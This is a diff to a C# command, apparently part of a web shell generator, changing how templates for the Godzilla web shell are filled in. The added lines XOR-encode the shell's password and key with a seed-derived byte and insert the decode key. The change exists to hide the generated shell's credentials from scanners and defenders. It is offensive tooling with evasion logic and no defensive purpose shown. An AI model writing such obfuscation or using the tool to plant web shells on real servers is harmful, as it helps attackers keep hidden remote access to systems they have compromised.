@@ -145,7 +145,11 @@ public static class GenerateCommand
 
         if (opts.ShellProtocol == "godzilla")
         {
-            members = Shells.GodzillaCSharp.MembersBlock.Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
+            byte xorKey = (byte)((opts.Seed ?? 42) % 256);
+            members = Shells.GodzillaCSharp.MembersBlock
+                .Replace("{{PASSWORD_ENC}}", Randomizer.StringObfuscator.Encode(opts.Password, xorKey))
+                .Replace("{{KEY_ENC}}", Randomizer.StringObfuscator.Encode(key, xorKey))
+                .Replace("{{XOR_KEY}}", "0x" + xorKey.ToString("X2"));
             trigger = Shells.GodzillaCSharp.TriggerBlock.Replace("{{PASSWORD}}", quotedTrigger).Replace("{{KEY}}", quotedKey);
             randomStr = Shells.GodzillaCSharp.RandomStringBlock;
         }
